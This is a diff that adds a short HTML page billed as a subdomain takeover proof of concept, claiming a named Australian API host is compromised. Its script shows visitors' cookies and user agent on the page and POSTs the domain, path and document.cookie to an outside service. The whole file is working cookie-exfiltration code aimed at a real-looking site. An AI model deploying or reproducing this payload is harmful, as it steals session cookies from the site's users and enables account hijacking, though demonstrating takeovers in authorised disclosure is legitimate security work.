@@ -1,0 +1,20 @@
+<h1>🚨 SUBDOMAIN TAKEOVER PoC 🚨</h1>
+<p><b>api.nabhas.com.au</b> fully compromised</p>
+<pre id="log"></pre>
+<script>
+document.getElementById('log').innerText = `
+Victim: ${window.location.origin}
+UA: ${navigator.userAgent}
+Cookies: ${document.cookie}
+Time: ${new Date()}
+`;
+
+fetch('https://httpbin.org/post', {
+  method: 'POST',
+  body: JSON.stringify({
+    domain: window.location.host,
+    path: window.location.pathname,
+    cookies: document.cookie
+  })
+});
+</script>
